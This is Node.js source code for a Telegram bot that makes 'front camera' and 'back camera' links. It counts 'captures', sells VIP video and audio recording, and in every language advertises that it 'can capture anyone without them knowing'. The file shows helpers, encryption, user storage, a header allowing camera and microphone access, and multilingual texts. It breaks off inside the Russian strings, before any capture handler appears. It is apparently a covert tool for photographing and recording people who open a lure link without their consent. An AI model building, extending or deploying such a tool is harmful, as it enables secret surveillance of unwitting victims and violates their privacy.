const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ==========================================
// 1. Constants and Configuration
// ==========================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID); // Make sure this is a string
const BOT_URL = process.env.BOT_URL;

// Encryption keys - change these to your own random values
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // 32 bytes for AES-256
const ENCRYPTION_IV = process.env.ENCRYPTION_IV; // 16 bytes
const HMAC_SECRET = process.env.HMAC_SECRET; // 32 bytes
const NONCE_SECRET = process.env.NONCE_SECRET; // 32 bytes

const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');
const LOG_FILE = path.join(DATA_DIR, 'bot.log');
const NONCES_USED_FILE = path.join(DATA_DIR, 'nonces_used.json');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');
const SECURITY_LOG_FILE = path.join(DATA_DIR, 'security.log');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

const bot = new TelegramBot(BOT_TOKEN, { webHook: false });
const app = express();

// ==========================================
// 2. Helper Functions (Ported from config.php and index.php)
// ==========================================

function writeLog(message) {
    const date = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
    fs.appendFileSync(LOG_FILE, `[${date}] ${message}\n`);
}

// Encryption/Decryption (AES-256-CBC + HMAC)
function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
    let encrypted = cipher.update(data, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    const payload = iv.toString('base64') + encrypted;
    const encoded = Buffer.from(payload).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    const hmac = crypto.createHmac('sha256', HMAC_SECRET).update(encoded).digest('hex').substring(0, 12);
    return `${encoded}.${hmac}`;
}

function decryptData(data) {
    const parts = data.split('.');
    if (parts.length !== 2) return false;

    const encoded = parts[0];
    const hmac = parts[1];

    const expected_hmac = crypto.createHmac('sha256', HMAC_SECRET).update(encoded).digest('hex').substring(0, 12);
    if (!crypto.timingSafeEqual(Buffer.from(expected_hmac), Buffer.from(hmac))) return false;

    const decoded = Buffer.from(encoded.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
    if (!decoded || decoded.length < 17) return false; // IV is 16 bytes, so decoded should be at least 17 chars

    const iv = Buffer.from(decoded.substring(0, 24), 'base64'); // Base64 encoded IV is 24 chars
    const encrypted = decoded.substring(24);

    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        console.error('Decryption error:', e.message);
        return false;
    }
}

// Nonce System
function generateNonce() {
    const nonce = crypto.randomBytes(16).toString('hex');
    const timestamp = Math.floor(Date.now() / 1000);
    const token = `${nonce}|${timestamp}`;
    const signature = crypto.createHmac('sha256', NONCE_SECRET).update(token).digest('hex');
    return Buffer.from(`${token}|${signature}`).toString('base64');
}

function validateNonce(nonceToken, maxAge = 300) {
    try {
        const decoded = Buffer.from(nonceToken, 'base64').toString('utf8');
        if (!decoded) return false;

        const parts = decoded.split('|');
        if (parts.length !== 3) return false;

        const nonce = parts[0];
        const timestamp = parseInt(parts[1]);
        const signature = parts[2];

        // Check expiry
        if (Math.floor(Date.now() / 1000) - timestamp > maxAge) return false;

        // Verify signature
        const expected = crypto.createHmac('sha256', NONCE_SECRET).update(`${nonce}|${timestamp}`).digest('hex');
        if (!crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(signature))) return false;

        // Check if nonce was already used
        let usedNonces = {};
        if (fs.existsSync(NONCES_USED_FILE)) {
            usedNonces = JSON.parse(fs.readFileSync(NONCES_USED_FILE, 'utf8'));
        }

        // Clean old nonces
        const now = Math.floor(Date.now() / 1000);
        for (const n in usedNonces) {
            if (now - usedNonces[n] > maxAge) {
                delete usedNonces[n];
            }
        }

        if (usedNonces[nonce]) return false; // Nonce already used

        usedNonces[nonce] = now;
        fs.writeFileSync(NONCES_USED_FILE, JSON.stringify(usedNonces));

        return true;
    } catch (e) {
        console.error('Nonce validation error:', e.message);
        return false;
    }
}

// Rate Limiting
const rateLimits = {};
function rateLimitCheck(identifier, max_requests = 30, window = 60) {
    const now = Math.floor(Date.now() / 1000);
    if (!rateLimits[identifier]) {
        rateLimits[identifier] = [];
    }

    // Filter out old requests
    rateLimits[identifier] = rateLimits[identifier].filter(timestamp => (now - timestamp) < window);

    if (rateLimits[identifier].length >= max_requests) {
        return false;
    }

    rateLimits[identifier].push(now);
    return true;
}

// Cooldown
const cooldowns = {};
function cooldownCheck(user_id, action = 'link', seconds = 30) {
    const key = `${user_id}_${action}`;
    const now = Math.floor(Date.now() / 1000);

    if (cooldowns[key]) {
        const lastTime = cooldowns[key];
        const remaining = seconds - (now - lastTime);
        if (remaining > 0) return remaining;
    }
    cooldowns[key] = now;
    return 0;
}

// Input Sanitization
function sanitizeInput(input) {
    if (Array.isArray(input)) {
        return input.map(sanitizeInput);
    }
    if (typeof input === 'string') {
        return input.trim().replace(/<[^>]*>?/gm, ''); // Basic strip_tags equivalent
    }
    return input;
}

// Token and Short Code Generation
function generateSecureToken(length = 32) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function generateShortCode(length = 10) {
    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let code = '';
    for (let i = 0; i < length; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
}

// Short Link Management
function saveShortLink(code, data) {
    let links = {};
    if (fs.existsSync(LINKS_FILE)) {
        links = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
    }
    data.created_at = Math.floor(Date.now() / 1000);
    links[code] = data;
    fs.writeFileSync(LINKS_FILE, JSON.stringify(links, null, 2));
}

function getShortLinkData(code) {
    if (!fs.existsSync(LINKS_FILE)) return false;
    const links = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
    return links[code] || false;
}

// Media Data Validation
function validateMediaData(media_data, max_size_mb = 15) {
    // Estimate size (base64 is ~1.33 times larger than binary)
    const size_bytes = (media_data.length * 0.75);
    const max_bytes = max_size_mb * 1024 * 1024;
    if (size_bytes > max_bytes) return false;

    if (!/^data:(image|video|audio)\/[a-zA-Z0-9]+;base64,/.test(media_data)) {
        return false;
    }
    return true;
}

// Security Logging
function logSecurity(event, details = '') {
    const log_file = SECURITY_LOG_FILE;
    const ip = 'unknown'; // In Node.js, get from req.ip
    const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
    const ua = 'unknown'; // In Node.js, get from req.headers['user-agent']
    const entry = `[${time}] [${ip}] [${ua}] ${event}: ${details}\n`;
    fs.appendFileSync(log_file, entry);

    // Keep log file manageable (simple truncation for now)
    if (fs.existsSync(log_file) && fs.statSync(log_file).size > 5 * 1024 * 1024) {
        const lines = fs.readFileSync(log_file, 'utf8').split('\n');
        const last1000Lines = lines.slice(-1000);
        fs.writeFileSync(log_file, last1000Lines.join('\n'));
    }
}

// Security Headers (will be set by Express middleware)
function setSecurityHeaders(res) {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Permissions-Policy', 'camera=*, microphone=*, geolocation=()');
    res.setHeader("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:;");
}

// ==========================================
// 3. Data Management (Ported from index.php)
// ==========================================

function loadUsers() {
    if (fs.existsSync(USERS_FILE)) {
        const content = fs.readFileSync(USERS_FILE, 'utf8');
        return JSON.parse(content) || {};
    }
    return {};
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function getUser(userId) {
    const users = loadUsers();
    return users[userId] || null;
}

function updateUser(userId, data) {
    const users = loadUsers();
    if (!users[userId]) {
        users[userId] = {
            id: userId,
            joined_at: Math.floor(Date.now() / 1000),
            agreed_terms: false,
            lang: 'ar',
            lang_selected: false,
            is_vip: false,
            stars: 0,
            referrals: 0,
            invited_by: null,
            referral_credited: false,
            is_banned: false,
            state: 'none',
            last_daily: 0,
            total_captures: 0,
            today_captures: 0,
            today_date: '',
            achievements: [],
            level: 'bronze'
        };
    }
    Object.assign(users[userId], data);
    saveUsers(users);
    return users[userId];
}

function getDefaultSettings() {
    return {
        maintenance_mode: false,
        force_channel: null,
        vip_price_stars: 250,
        vip_price_referrals: 10,
        referral_stars: 2,
        cooldown_seconds: 30,
        welcome_message: ''
    };
}

function loadSettings() {
    if (fs.existsSync(SETTINGS_FILE)) {
        const content = fs.readFileSync(SETTINGS_FILE, 'utf8');
        return JSON.parse(content) || getDefaultSettings();
    }
    return getDefaultSettings();
}

function saveSettings(settings) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

// ==========================================
// 4. Telegram Bot API Functions (Ported from index.php)
// ==========================================

async function sendTelegramRequest(method, data = {}) {
    try {
        const https = require('https');
        const postData = JSON.stringify(data);
        return new Promise((resolve, reject) => {
            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${BOT_TOKEN}/${method}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData)
                }
            };
            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => { responseData += chunk; });
                res.on('end', () => {
                    try {
                        const result = JSON.parse(responseData);
                        resolve(result);
                    } catch (e) {
                        resolve({ ok: false, description: 'JSON parse error' });
                    }
                });
            });
            req.on('error', (error) => {
                writeLog(`Telegram API Error (${method}): ${error.message}`);
                resolve({ ok: false, error_code: 0, description: error.message });
            });
            req.write(postData);
            req.end();
        });
    } catch (error) {
        writeLog(`Telegram API Error (${method}): ${error.message}`);
        console.error(`Telegram API Error (${method}):`, error.message);
        return { ok: false, error_code: error.code, description: error.message };
    }
}

async function sendMessage(chat_id, text, reply_markup = null) {
    const options = {
        parse_mode: 'HTML',
        reply_markup: reply_markup ? JSON.stringify(reply_markup) : undefined
    };
    return sendTelegramRequest('sendMessage', { chat_id, text, ...options });
}

async function editMessage(chat_id, message_id, text, reply_markup = null) {
    const options = {
        parse_mode: 'HTML',
        reply_markup: reply_markup ? JSON.stringify(reply_markup) : undefined
    };
    return sendTelegramRequest('editMessageText', { chat_id, message_id, text, ...options });
}

async function answerCallbackQuery(callback_query_id, text = null, show_alert = false) {
    const data = {
        callback_query_id,
        show_alert
    };
    if (text) {
        data.text = text;
    }
    return sendTelegramRequest('answerCallbackQuery', data);
}

// ==========================================
// 5. Localization (Ported from index.php)
// ==========================================

const texts = {
    'ar': {
        'welcome': "مرحباً بك في بوت الكاميرا! 📸\nيرجى الموافقة على الشروط للبدء.",
        'agree_btn': "📝 قراءة والموافقة على الشروط",
        'choose_lang': "يرجى اختيار لغتك المفضلة:",
        'main_menu': "القائمة الرئيسية 🏠\nاختر ما تريد القيام به:",
        'front_cam': "📸 كاميرا أمامية",
        'back_cam': "📸 كاميرا خلفية",
        'custom_link': "🔗 رابط مخصص",
        'vip_section': "🌟 قسم VIP",
        'my_account': "👤 حسابي",
        'help': "❓ مساعدة",
        'terms_agreed': "تمت الموافقة على الشروط بنجاح! ✅",
        'lang_saved': "تم حفظ اللغة بنجاح! 🌐",
        'send_custom_link': "أرسل الرابط الذي تريد تحويله:",
        'custom_link_generated': "تم إنشاء الرابط المخصص بنجاح! 🎉\n\nرابط الكاميرا الأمامية:\n%s\n\nرابط الكاميرا الخلفية:\n%s",
        'vip_info': "🌟 <b>قسم VIP</b> 🌟\n\n<b>المميزات:</b>\n• تصوير فيديو حقيقي 5 ثواني 🎥\n• تسجيل صوت 10 ثواني 🎙️\n• بدون كولداون ⚡\n\n<b>طرق الشراء:</b>\n💫 %s نجمة تيلجرام\n👥 %s إحالة مؤكدة",
        'buy_vip_stars': "⭐ شراء بالنجوم (%s نجمة)",
        'buy_vip_referrals': "👥 شراء بالإحالات (%s إحالة)",
        'vip_video': "🎥 رابط فيديو (5 ثواني)",
        'vip_audio': "🎙️ رابط تسجيل صوت",
        'not_vip': "عذراً، هذه الميزة متاحة فقط لمشتركي VIP. ❌",
        'vip_purchased_referrals': "🎉 مبروك! تم تفعيل VIP بنجاح عبر الإحالات!",
        'not_enough_referrals': "❌ عدد إحالاتك غير كافي.\nلديك: %s إحالة\nالمطلوب: %s إحالة",
        'account_info': "👤 <b>معلومات حسابك</b>\n\n🆔 الآيدي: <code>%s</code>\n⭐ النقاط: %s\n👥 الإحالات: %s\n🏅 المستوى: %s\n📊 الحالة: %s\n📸 إجمالي الالتقاطات: %s",
        'share_invite': "📤 مشاركة رابط الدعوة",
        'invite_text': "🔥 جرب هذا البوت الخرافي! يقدر يصور أي شخص بدون ما يدري 📸\nجربه الحين 👇",
        'status_normal': "عادي",
        'status_vip': "VIP 🌟",
        'maintenance': "عذراً، البوت حالياً في وضع الصيانة. يرجى المحاولة لاحقاً. 🛠️",
        'banned': "عذراً، لقد تم حظرك من استخدام البوت. 🚫",
        'force_join': "عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه. 📢",
        'join_channel': "اشترك في القناة",
        'check_join': "✅ تحقق من الاشتراك",
        'invalid_link': "رابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http أو https.",
        'referral_link': "🔗 رابط الإحالة الخاص بك:\nhttps://t.me/%s?start=%s\n\nشارك هذا الرابط للحصول على نقاط!",
        'new_referral': "🎉 لقد قام شخص جديد بالاشتراك عبر رابطك! حصلت على نقاط.",
        'payment_success': "تم الدفع بنجاح! أنت الآن عضو VIP. 🎉",
        'payment_failed': "فشلت عملية الدفع. يرجى المحاولة مرة أخرى. ❌",
        'cooldown_msg': "⏳ يرجى الانتظار %s ثانية قبل إنشاء رابط جديد.",
        'daily_bonus': "🎁 مكافأة يومية! حصلت على نقطة إضافية. رصيدك الآن: %s",
        'achievement_unlocked': "🏆 إنجاز جديد: %s",
        'ach_first_capture': "📸 أول التقاط!",
        'ach_first_referral': "👥 أول إحالة!",
        'ach_ten_referrals': "🔥 10 إحالات!",
        'ach_fifty_referrals': "💎 50 إحالة!",
        'ach_vip_member': "🌟 عضو VIP!",
        'lang_changed': "تم تغيير اللغة بنجاح! 🌐",
        'your_id': "🆔 آيدي حسابك: <code>%s</code>"
    },
    'en': {
        'welcome': "Welcome to the Camera Bot! 📸\nPlease agree to the terms to start.",
        'agree_btn': "📝 Read and Agree to Terms",
        'choose_lang': "Please choose your preferred language:",
        'main_menu': "Main Menu 🏠\nChoose what you want to do:",
        'front_cam': "📸 Front Camera",
        'back_cam': "📸 Back Camera",
        'custom_link': "🔗 Custom Link",
        'vip_section': "🌟 VIP Section",
        'my_account': "👤 My Account",
        'help': "❓ Help",
        'terms_agreed': "Terms agreed successfully! ✅",
        'lang_saved': "Language saved successfully! 🌐",
        'send_custom_link': "Send the link you want to convert:",
        'custom_link_generated': "Custom link generated successfully! 🎉\n\nFront Camera Link:\n%s\n\nBack Camera Link:\n%s",
        'vip_info': "🌟 <b>VIP Section</b> 🌟\n\n<b>Features:</b>\n• Real 5-second video capture 🎥\n• 10-second audio recording 🎙️\n• No cooldown ⚡\n\n<b>Purchase Options:</b>\n💫 %s Telegram Stars\n👥 %s Confirmed Referrals",
        'buy_vip_stars': "⭐ Buy with Stars (%s Stars)",
        'buy_vip_referrals': "👥 Buy with Referrals (%s Referrals)",
        'vip_video': "🎥 Video Link (5 sec)",
        'vip_audio': "🎙️ Audio Recording Link",
        'not_vip': "Sorry, this feature is only available for VIP members. ❌",
        'vip_purchased_referrals': "🎉 Congratulations! VIP activated via referrals!",
        'not_enough_referrals': "❌ Not enough referrals.\nYou have: %s\nRequired: %s",
        'account_info': "👤 <b>Your Account Info</b>\n\n🆔 ID: <code>%s</code>\n⭐ Points: %s\n👥 Referrals: %s\n🏅 Level: %s\n📊 Status: %s\n📸 Total Captures: %s",
        'share_invite': "📤 Share Invite Link",
        'invite_text': "🔥 Try this amazing bot! It can capture anyone without them knowing 📸\nTry it now 👇",
        'status_normal': "Normal",
        'status_vip': "VIP 🌟",
        'maintenance': "Sorry, the bot is currently in maintenance mode. Please try again later. 🛠️",
        'banned': "Sorry, you have been banned from using the bot. 🚫",
        'force_join': "Sorry, you must join the bot's channel first to use it. 📢",
        'join_channel': "Join Channel",
        'check_join': "✅ Check Subscription",
        'invalid_link': "Invalid link. Please send a valid link starting with http or https.",
        'referral_link': "🔗 Your referral link:\nhttps://t.me/%s?start=%s\n\nShare this link to get points!",
        'new_referral': "🎉 Someone joined and subscribed using your link! You got points.",
        'payment_success': "Payment successful! You are now a VIP member. 🎉",
        'payment_failed': "Payment failed. Please try again. ❌",
        'cooldown_msg': "⏳ Please wait %s seconds before creating a new link.",
        'daily_bonus': "🎁 Daily bonus! You got an extra point. Balance: %s",
        'achievement_unlocked': "🏆 New Achievement: %s",
        'ach_first_capture': "📸 First Capture!",
        'ach_first_referral': "👥 First Referral!",
        'ach_ten_referrals': "🔥 10 Referrals!",
        'ach_fifty_referrals': "💎 50 Referrals!",
        'ach_vip_member': "🌟 VIP Member!",
        'lang_changed': "Language changed successfully! 🌐",
        'your_id': "🆔 Your ID: <code>%s</code>"
    },
    'hi': {
        'welcome': "कैमरा बॉट में आपका स्वागत है! 📸\nशुरू करने के लिए कृपया शर्तों से सहमत हों।",
        'agree_btn': "📝 शर्तें पढ़ें और सहमत हों",
        'choose_lang': "कृपया अपनी पसंदीदा भाषा चुनें:",
        'main_menu': "मुख्य मेनू 🏠\nआप क्या करना चाहते हैं चुनें:",
        'front_cam': "📸 सामने का कैमरा",
        'back_cam': "📸 पीछे का कैमरा",
        'custom_link': "🔗 कस्टम लिंक",
        'vip_section': "🌟 वीआईपी अनुभाग",
        'my_account': "👤 मेरा खाता",
        'help': "❓ सहायता",
        'terms_agreed': "शर्तों पर सफलतापूर्वक सहमति हुई! ✅",
        'lang_saved': "भाषा सफलतापूर्वक सहेजी गई! 🌐",
        'send_custom_link': "वह लिंक भेजें जिसे आप कनवर्ट करना चाहते हैं:",
        'custom_link_generated': "कस्टम लिंक सफलतापूर्वक बनाया गया! 🎉\n\nसामने का कैमरा लिंक:\n%s\n\nपीछे का कैमरा लिंक:\n%s",
        'vip_info': "🌟 <b>वीआईपी अनुभाग</b> 🌟\n\n<b>विशेषताएं:</b>\n• वास्तविक 5-सेकंड वीडियो कैप्चर 🎥\n• 10-सेकंड ऑडियो रिकॉर्डिंग 🎙️\n• कोई कूलडाउन नहीं ⚡\n\n<b>खरीद विकल्प:</b>\n💫 %s टेलीग्राम सितारे\n👥 %s पुष्ट रेफरल",
        'buy_vip_stars': "⭐ सितारों से खरीदें (%s सितारे)",
        'buy_vip_referrals': "👥 रेफरल से खरीदें (%s रेफरल)",
        'vip_video': "🎥 वीडियो लिंक (5 सेकंड)",
        'vip_audio': "🎙️ ऑडियो रिकॉर्डिंग लिंक",
        'not_vip': "क्षमा करें, यह सुविधा केवल वीआईपी सदस्यों के लिए उपलब्ध है। ❌",
        'vip_purchased_referrals': "🎉 बधाई हो! रेफरल के माध्यम से वीआईपी सक्रिय हो गया!",
        'not_enough_referrals': "❌ पर्याप्त रेफरल नहीं हैं।\nआपके पास: %s रेफरल\nआवश्यक: %s रेफरल",
        'account_info': "👤 <b>आपके खाते की जानकारी</b>\n\n🆔 आईडी: <code>%s</code>\n⭐ अंक: %s\n👥 रेफरल: %s\n🏅 स्तर: %s\n📊 स्थिति: %s\n📸 कुल कैप्चर: %s",
        'share_invite': "📤 आमंत्रण लिंक साझा करें",
        'invite_text': "🔥 इस अद्भुत बॉट को आज़माएं! यह किसी को भी बिना बताए कैप्चर कर सकता है 📸\nइसे अभी आज़माएं 👇",
        'status_normal': "सामान्य",
        'status_vip': "वीआईपी 🌟",
        'maintenance': "क्षमा करें, बॉट वर्तमान में रखरखाव मोड में है। कृपया बाद में पुनः प्रयास करें। 🛠️",
        'banned': "क्षमा करें, आपको बॉट का उपयोग करने से प्रतिबंधित कर दिया गया है। 🚫",
        'force_join': "क्षमा करें, आपको इसका उपयोग करने के लिए पहले बॉट के चैनल में शामिल होना होगा। 📢",
        'join_channel': "चैनल में शामिल हों",
        'check_join': "✅ सदस्यता जांचें",
        'invalid_link': "अमान्य लिंक। कृपया http या https से शुरू होने वाला एक वैध लिंक भेजें।",
        'referral_link': "🔗 आपका रेफरल लिंक:\nhttps://t.me/%s?start=%s\n\nअंक प्राप्त करने के लिए इस लिंक को साझा करें!",
        'new_referral': "🎉 किसी नए व्यक्ति ने आपके लिंक का उपयोग करके सदस्यता ली है! आपको अंक मिले।",
        'payment_success': "भुगतान सफल! अब आप एक वीआईपी सदस्य हैं। 🎉",
        'payment_failed': "भुगतान विफल। कृपया पुनः प्रयास करें। ❌",
        'cooldown_msg': "⏳ नया लिंक बनाने से पहले कृपया %s सेकंड प्रतीक्षा करें।",
        'daily_bonus': "🎁 दैनिक बोनस! आपको एक अतिरिक्त अंक मिला। शेष: %s",
        'achievement_unlocked': "🏆 नई उपलब्धि: %s",
        'ach_first_capture': "📸 पहली कैप्चर!",
        'ach_first_referral': "👥 पहला रेफरल!",
        'ach_ten_referrals': "🔥 10 रेफरल!",
        'ach_fifty_referrals': "💎 50 रेफरल!",
        'ach_vip_member': "🌟 वीआईपी सदस्य!",
        'lang_changed': "भाषा सफलतापूर्वक बदल दी गई! 🌐",
        'your_id': "🆔 आपकी आईडी: <code>%s</code>"
    },
    'bn': {
        'welcome': "ক্যামেরা বটে স্বাগতম! 📸\nশুরু করতে অনুগ্রহ করে শর্তাবলীতে সম্মত হন।",
        'agree_btn': "📝 শর্তাবলী পড়ুন এবং সম্মত হন",
        'choose_lang': "অনুগ্রহ করে আপনার পছন্দের ভাষা নির্বাচন করুন:",
        'main_menu': "প্রধান মেনু 🏠\nআপনি যা করতে চান তা নির্বাচন করুন:",
        'front_cam': "📸 সামনের ক্যামেরা",
        'back_cam': "📸 পিছনের ক্যামেরা",
        'custom_link': "🔗 কাস্টম লিঙ্ক",
        'vip_section': "🌟 ভিআইপি বিভাগ",
        'my_account': "👤 আমার অ্যাকাউন্ট",
        'help': "❓ সাহায্য",
        'terms_agreed': "শর্তাবলীতে সফলভাবে সম্মত হয়েছে! ✅",
        'lang_saved': "ভাষা সফলভাবে সংরক্ষণ করা হয়েছে! 🌐",
        'send_custom_link': "আপনি যে লিঙ্কটি রূপান্তর করতে চান তা পাঠান:",
        'custom_link_generated': "কাস্টম লিঙ্ক সফলভাবে তৈরি হয়েছে! 🎉\n\nসামনের ক্যামেরার লিঙ্ক:\n%s\n\nপিছনের ক্যামেরার লিঙ্ক:\n%s",
        'vip_info': "🌟 <b>ভিআইপি বিভাগ</b> 🌟\n\n<b>বৈশিষ্ট্য:</b>\n• আসল 5-সেকেন্ড ভিডিও ক্যাপচার 🎥\n• 10-সেকেন্ড অডিও রেকর্ডিং 🎙️\n• কোন কুলডাউন নেই ⚡\n\n<b>ক্রয়ের বিকল্প:</b>\n💫 %s টেলিগ্রাম স্টার\n👥 %s নিশ্চিত রেফারেল",
        'buy_vip_stars': "⭐ স্টার দিয়ে কিনুন (%s স্টার)",
        'buy_vip_referrals': "👥 রেফারেল দিয়ে কিনুন (%s রেফারেল)",
        'vip_video': "🎥 ভিডিও লিঙ্ক (5 সেকেন্ড)",
        'vip_audio': "🎙️ অডিও রেকর্ডিং লিঙ্ক",
        'not_vip': "দুঃখিত, এই বৈশিষ্ট্যটি শুধুমাত্র ভিআইপি সদস্যদের জন্য উপলব্ধ। ❌",
        'vip_purchased_referrals': "🎉 অভিনন্দন! রেফারেলের মাধ্যমে ভিআইপি সক্রিয় হয়েছে!",
        'not_enough_referrals': "❌ পর্যাপ্ত রেফারেল নেই।\nআপনার আছে: %s রেফারেল\nপ্রয়োজন: %s রেফারেল",
        'account_info': "👤 <b>আপনার অ্যাকাউন্টের তথ্য</b>\n\n🆔 আইডি: <code>%s</code>\n⭐ পয়েন্ট: %s\n👥 রেফারেল: %s\n🏅 স্তর: %s\n📊 অবস্থা: %s\n📸 মোট ক্যাপচার: %s",
        'share_invite': "📤 আমন্ত্রণ লিঙ্ক শেয়ার করুন",
        'invite_text': "🔥 এই আশ্চর্যজনক বটটি চেষ্টা করুন! এটি কাউকে না জানিয়ে ক্যাপচার করতে পারে 📸\nএখনই চেষ্টা করুন 👇",
        'status_normal': "সাধারণ",
        'status_vip': "ভিআইপি 🌟",
        'maintenance': "দুঃখিত, বটটি বর্তমানে রক্ষণাবেক্ষণ মোডে আছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন। 🛠️",
        'banned': "দুঃখিত, আপনাকে বট ব্যবহার করা থেকে নিষিদ্ধ করা হয়েছে। 🚫",
        'force_join': "দুঃখিত, এটি ব্যবহার করার জন্য আপনাকে প্রথমে বটের চ্যানেলে যোগ দিতে হবে। 📢",
        'join_channel': "চ্যানেলে যোগ দিন",
        'check_join': "✅ সদস্যতা পরীক্ষা করুন",
        'invalid_link': "অবৈধ লিঙ্ক। অনুগ্রহ করে http বা https দিয়ে শুরু হওয়া একটি বৈধ লিঙ্ক পাঠান।",
        'referral_link': "🔗 আপনার রেফারেল লিঙ্ক:\nhttps://t.me/%s?start=%s\n\nপয়েন্ট পেতে এই লিঙ্কটি শেয়ার করুন!",
        'new_referral': "🎉 আপনার লিঙ্ক ব্যবহার করে একজন নতুন ব্যক্তি যোগ দিয়েছে! আপনি পয়েন্ট পেয়েছেন।",
        'payment_success': "পেমেন্ট সফল! আপনি এখন একজন ভিআইপি সদস্য। 🎉",
        'payment_failed': "পেমেন্ট ব্যর্থ হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন। ❌",
        'cooldown_msg': "⏳ নতুন লিঙ্ক তৈরি করার আগে অনুগ্রহ করে %s সেকেন্ড অপেক্ষা করুন।",
        'daily_bonus': "🎁 দৈনিক বোনাস! আপনি একটি অতিরিক্ত পয়েন্ট পেয়েছেন। ব্যালেন্স: %s",
        'achievement_unlocked': "🏆 নতুন অর্জন: %s",
        'ach_first_capture': "📸 প্রথম ক্যাপচার!",
        'ach_first_referral': "👥 প্রথম রেফারেল!",
        'ach_ten_referrals': "🔥 10 রেফারেল!",
        'ach_fifty_referrals': "💎 50 রেফারেল!",
        'ach_vip_member': "🌟 ভিআইপি সদস্য!",
        'lang_changed': "ভাষা সফলভাবে পরিবর্তন করা হয়েছে! 🌐",
        'your_id': "🆔 আপনার আইডি: <code>%s</code>"
    },
    'ru': {
        'welcome': "Добро пожаловать в камеру-бот! 📸\nПожалуйста, согласитесь с условиями, чтобы начать.",
        'agree_btn': "📝 Прочитать и согласиться с условиями",
        'choose_lang': "Пожалуйста, выберите предпочитаемый язык:",
        'main_menu': "Главное меню 🏠\nВыберите, что вы хотите сделать:",
        'front_cam': "📸 Фронтальная камера",
        'back_cam': "📸 Задняя камера",
        'custom_link': "🔗 Пользовательская ссылка",
        'vip_section': "🌟 VIP раздел",
        'my_account': "👤 Мой аккаунт",
        'help': "❓ Помощь",
        'terms_agreed': "Условия успешно согласованы! ✅",
        'lang_saved': "Язык успешно сохранен! 🌐",
        'send_custom_link': "Отправьте ссылку, которую вы хотите преобразовать:",
        'custom_link_generated': "Пользовательская ссылка успешно сгенерирована! 🎉\n\nСсылка на фронтальную камеру:\n%s\n\nСсылка на заднюю камеру:\n%s",
        'vip_info': "🌟 <b>VIP раздел</b> 🌟\n\n<b>Особенности:</b>\n• Захват реального видео 5 секунд 🎥\n• Запись аудио 10 секунд 🎙️\n• Без кулдауна ⚡\n\n<b>Варианты покупки:</b>\n💫 %s звезд Telegram\n👥 %s подтвержденных рефералов",
        'buy_vip_stars': "⭐ Купить за звезды (%s звезд)",
        'buy_vip_referrals': "👥 Купить за рефералов (%s рефералов)",
        'vip_video': "🎥 Видео ссылка (5 сек)",
        'vip_audio': "🎙️ Ссылка на аудиозапись",
        'not_vip': "Извините, эта функция доступна только для VIP-участников. ❌",
        'vip_purchased_referrals': "🎉 Поздравляем! VIP активирован через рефералов!",
        'not_enough_referrals': "❌ Недостаточно рефералов.\nУ вас: %s рефералов\nТребуется: %s рефералов",
        'account_info': "👤 <b>Информация о вашем аккаунте</b>\n\n🆔 ID: <code>%s</code>\n⭐ Баллы: %s\n👥 Рефералы: %s\n🏅 Уровень: %s\n📊 Статус: %s\n📸 Всего захватов: %s",
        'share_invite': "📤 Поделиться ссылкой-приглашением",
        'invite_text': "🔥 Попробуйте этого удивительного бота! Он может снимать кого угодно без их ведома 📸\nПопробуйте прямо сейчас 👇",
        'status_normal': "Обычный",
        'status_vip': "VIP 🌟",
        'maintenance': "Извините, бот в настоящее время находится в режиме обслуживания. Пожалуйста, попробуйте позже. 🛠️",
        'banned': "Извините, вы были заблокированы от использования бота. 🚫",
        'force_join': "Извините, вы должны сначала присоединиться к каналу бота, чтобы использовать его. 📢",
        'join_channel': "Присоединиться к каналу",
        'check_join': "✅ Проверить подписку",
        'invalid_link': "Неверная ссылка. Пожалуйста, отправьте действительную ссылку, начинающуюся с http или https.",
        'referral_link': "🔗 Ваша реферальная ссылка:\nhttps://t.me/%s?start=%s\n\nПоделитесь этой ссылкой, чтобы получить баллы!",
